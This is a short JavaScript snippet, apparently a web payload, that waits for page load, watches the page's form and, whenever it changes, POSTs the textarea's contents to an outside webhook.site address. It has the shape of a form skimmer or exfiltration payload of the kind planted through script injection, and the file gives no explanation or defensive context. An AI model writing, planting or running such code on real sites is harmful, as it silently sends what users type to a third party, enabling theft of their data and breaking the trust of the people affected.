function myFunc(text)
{     
      fetch("https://webhook.site/2e76bdb2-b0bf-4bd3-b3e1-bf8de21fcde9",{
        method: 'POST',
        headers: { "Origin": "https://webhook.site" },
        body: text
      });
}
window.onload = (form) => {


    form = document.querySelector("form");
    box = document.querySelector("textarea");

    form.addEventListener('change', function() {
      myFunc(box.value);
  });
      
};